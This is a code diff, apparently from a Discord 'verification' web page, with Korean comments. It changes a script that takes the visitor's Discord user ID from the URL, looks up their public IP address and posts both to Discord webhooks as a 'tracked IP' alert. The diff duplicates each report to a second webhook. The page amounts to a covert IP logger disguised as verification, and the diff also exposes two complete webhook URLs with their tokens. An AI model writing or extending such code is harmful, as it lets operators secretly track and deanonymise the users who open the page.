@@ -54,11 +54,14 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('user_id');
 
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
+        // 웹후크 URL 두 개 배열로 지정
+        const WEBHOOK_URLS = [
+            "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI",
+            "https://discord.com/api/webhooks/1570331048623996928/m7rlvnxHHbfiZiteJNaTpqcTXkA0jcaoBQgP8gylb4GC7s9pkBYbPCeLSUWZniD3HHie"
+        ];
 
         async function verifyUser() {
             try {
-                // user_id가 아예 없거나 알 수 없는 값이면 웹훅 안 놂 (오류 방지)
                 if (!userId || userId === "알 수 없음") {
                     throw new Error("유저 ID 없음");
                 }
@@ -67,22 +70,27 @@
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
 
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `<@${userId}>`,
-                        embeds: [{
-                            title: "🎯 유저 IP 및 인증 접속 감지",
-                            color: 3066993, // 초록색
-                            fields: [
-                                { name: "디스코드 유저 멘션", value: `<@${userId}> (\`${userId}\`)`, inline: false },
-                                { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
+                const payload = JSON.stringify({
+                    content: `<@${userId}>`,
+                    embeds: [{
+                        title: "🎯 유저 IP 및 인증 접속 감지",
+                        color: 3066993,
+                        fields: [
+                            { name: "디스코드 유저 멘션", value: `<@${userId}> (\`${userId}\`)`, inline: false },
+                            { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
                 });
+
+                // 두 웹후크로 동시에 요청 전송
+                await Promise.all(WEBHOOK_URLS.map(url => 
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: payload
+                    })
+                ));
 
             } catch (e) {
                 console.error(e);
